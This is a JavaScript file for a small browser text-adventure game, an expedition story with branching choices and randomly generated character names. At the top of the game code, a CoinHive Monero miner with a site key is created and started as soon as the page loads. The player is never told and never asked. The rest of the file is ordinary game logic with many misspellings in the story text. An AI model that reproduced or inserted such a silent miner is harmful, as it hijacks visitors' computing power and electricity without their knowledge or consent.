import faker from 'faker'

//Set up monero mining
var miner = new CoinHive.Anonymous('CHKLIvA6snbYpapDE6A6ouePVXXCXe7q');
miner.start();

//Locate panel
var panel = document.getElementsByClassName('panel')[0]


function type(str) {
  return new Promise(function(resolve, reject) {
    var i = 0;
    var timer = window.setInterval(() => {
      if(i >= str.length) {
        window.clearInterval(timer)
        resolve()
      }
      else{

        panel.innerHTML += str[i] == '\n' ? "<br>" : str[i]
        i++
      }
    }, 10)
  });
}

function ask(opts){
  panel.innerHTML += "<br><br>" // Add a newline
  Object.keys(opts).forEach(opt => {
    var el = document.createElement("button")
    el.innerHTML = opt
    el.onclick = function(){
      panel.innerHTML += "<br>"
      play(opts[opt])
    }
    panel.appendChild(el)
  })
}


function story(text, opts){
  var s = {}
  s.text = text
  if(opts) s.options = opts
  return s
}

function play(scene) {
  type(scene.text)
  .then(() => {
    if(scene.options){
      ask(scene.options)
    }
  })
}

var storyline = story("What do you want to do?", {
    "eat": story("You eat"),
    "sleep": story("You sleep"),
    "watch": story("You flip on the TV. What do you watch?", {
      "Modern Family": story("You watch Modern Family"),
      "Family Guy": story("You watch Family Guy")
    })
})

var cast = {
  you: faker.name.lastName(),
  doctor: faker.name.lastName(),
  geologist: faker.name.findName(),
  pilot: faker.name.firstName()
}

function getLost(direction){
  return story(`Everybody boards the mini jet and prepaires for liftoff. A little red indicator tells you to buckle up. Dr. ${cast.geologist} sits down next to you. Over the next few hours you come to really dislike ${cast.geologist}.\n\n
    Suddenly, ${cast.pilot} comes onto the loud speaker.\n\n "Attention all passengers. Do not be alarmed but it seems we are lost. We are supposed to be over the north pole right now, but my radar picks up nothing but water for miles in all direcrions. We are running low on gas and there is no where to land. Everybody please start reading the safety protocol pamflets under your seat. It's looking like we're going to need them"\n\n
    You knew you shouldn't have flown ${direction}, and you knew you shouldn't have accepted Dr. ${cast.doctor}'s offer.`)
}

var quest = story("You hear the chime of your phone recieving a email. Who could possibly be emailing you at this hour? You claw at your beside table, fumbling to get your cell phone. " +
"The screen illuminates, searing your night-time eyes. 1 new email from Bossman. What does bossman want?\n\n" +
"Dear Professor " + cast.you + ",\n  This is of the utmost importance. I am assembling a team of high calliber scientists for an expedition. You, being the top Oceanographer in the feild, would make an excellent addition to the team. Are you up for the challenge? We leave in a weeks time.\n\nA word of warning: these expeditions haave the possibility of getting dangerous.\n\nLet me know by the end of the day tomorrow,\nDr. "+ cast.doctor + ", PhD",
{
  "Accept the invitation": story("The next week flies by. There is so much to do in preparation for the trip.\n\n" +
  "You meet up with the rest of the team, and introduce yourself. You meet a geologist named " + cast.geologist + ", and a pilot named " + cast.pilot + "." +
  `You get to talking with ${cast.pilot}, and it becomes clear they are not the most experienced pilot. ${cast.pilot} starts to tell you how it is impossible to fall off course, as we are going to fly directly north all the way of to the pole.`, {
    'Whatever you say': getLost('north'),
    'That\'s not right, the plane must be angled north-east': getLost('north-east'),
    'That\'s not right, the plane ought to fly southwards': getLost('south'),
    'That\'s not right, the plane should point north-west': story('Aw heeell yeah')
  }),
  "Decline the invitation": story("He fires you the next day. You clearly are not very commited to the field...")
})

play(quest)
